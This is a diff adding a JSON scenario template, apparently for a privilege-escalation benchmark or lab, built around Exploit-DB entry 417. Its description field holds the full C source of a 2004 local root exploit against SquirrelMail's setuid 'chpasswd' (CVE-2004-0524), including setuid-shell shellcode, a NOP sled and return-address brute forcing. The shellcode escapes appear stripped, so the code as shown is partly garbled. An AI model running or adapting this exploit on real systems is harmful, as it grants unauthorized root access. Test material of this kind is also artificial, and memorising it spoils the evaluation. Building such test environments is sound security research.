@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_417",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: SquirrelMail - 'chpasswd' Local Privilege Escalation (Brute Force) (OSVDB-5551;CVE-2004-0524)\n\nExploit source code (417.c):\n```\n/*\n\n** PST_chpasswd_exp-v_b.c:\n**\n** Squirrelmail chpasswd local root bruteforce exploit\n** Author:\n** Bytes<Bytes[at]ph4nt0m.net> || <Bytes[at]ph4nt0m.org>\n** www ph4nt0m net\n** Notice:\n** v_b: Local bruteforce version\n** v_R: remote bruteforce version\n**\n**\n** Greatze: #ph4nt0m,#music@0x557\n** All PST member,Grip2,Airsupply,Jambalaya,Ann,Paul,Happy...\n** Thax: My GF(Luz),Oyxin,Winewind,Envymask,Eong,luoluo,GoGo(f0r ever)...\n**\n**\n** -=-=-=-=-=-=-=-=-=-= !!![+PH4NT0M TEAM PRIVATE EXPLOIT+]!!! =-=-=-=-=-=-=-=-=-=-\n**\n** Date: 2004-04 # DO NOT DISTRIBUTE #\n**\n** You Must get account belong to Webmaster ,www or other webserver groups.\n**\n*/\n\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n\n#define NOP 0x90\n#define Fuckpr0 \"./chpasswd\" /* you need modify it by yourself */\n#define LOOP 2000 /* loop of bruteforce */\n\n/* setuid(0) shellcode by by Matias Sedalo 3x ^_^ */\n\nchar shellcode[] =\"x31xdbx53x8dx43x17xcdx80x99x68x6ex2fx73x68x68\"\n\"x2fx2fx62x69x89xe3x50x53x89xe1xb0x0bxcdx80\";\n\nunsigned long get_esp() {\n\n__asm__ (\"movl %esp,%eax\");\n\n}\n\nvoid *M_malloc(size_t size){\n\nregister void *value;\n\nvalue = malloc(size);\n\nif(value == NULL){\n\nprintf(\"ERROR:virtual memory exhausted...n\");\n\nexit(-1);\n\n}\n\nreturn value;\n\n}\n\nint main(void){\n\nunsigned long ret_addr;\n\nint i,j=0,offset=2,status;\n\nchar *buf1,*buf2;\n\npid_t pid;\n\nret_addr = get_esp() - strlen(Fuckpr0) - strlen(shellcode);\n\nprintf(\"t-------------------------------------------------------n\");\nprintf(\"t Squirrelmail chpasswd local root bruteforce exploit n\");\nprintf(\"t code By Bytes<Bytes[at]ph4nt0m.org> 2004 n\");\nprintf(\"t http://www.ph4nt0m.net n\");\nprintf(\"t#######################################################n\");\n\n\nsleep(1);\n\nprintf(\"[+] Bruteforce......nn\");\n\nsleep(2);\n\nbuf1 = (char *)M_malloc(150);\n\nbuf2 = (char *)M_malloc(600);\n\nwhile(j <= LOOP){\n\nif((pid = fork()) == 0){\n\nmemset(buf2,0x90,sizeof(buf2) - strlen(shellcode) - 8);\n\nmemcpy(buf2 + sizeof(buf2) - strlen(shellcode) - 8,shellcode,sizeof(shellcode));\n\nfor(i=0; i < 150; i+=4){\n\n*((unsigned long *)(buf1+i)) = ret_addr;\n\n}\n\nprintf(\"buf1 = %sn\",buf1);\n\nexecl(Fuckpr0,\"chpasswd\",buf1,buf2,0);\n\n}\n\nwait(&status);\n\nprintf(\"[-] Signal: #%in\", status);\n\nif(WIFEXITED(status) != 0 ) {\n\nprintf(\"[=] Step.%i: 0x%xn[~] Exiting...n\",(j/2),ret_addr);\n\nexit(1);\n\n}else{\n\nret_addr += offset;\n\nj += offset;\n\nprintf(\"[=] Offset:%d Use ret:0x%xn\",j, ret_addr);\n\n}\n\n}\n\nfree(buf1);\n\nfree(buf2);\n\nreturn 1;\n\n}\n\n// milw0rm.com [2004-08-25]\n```",
+  "cve": "OSVDB-5551;CVE-2004-0524",
+  "exploitdb_id": "417",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_417",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
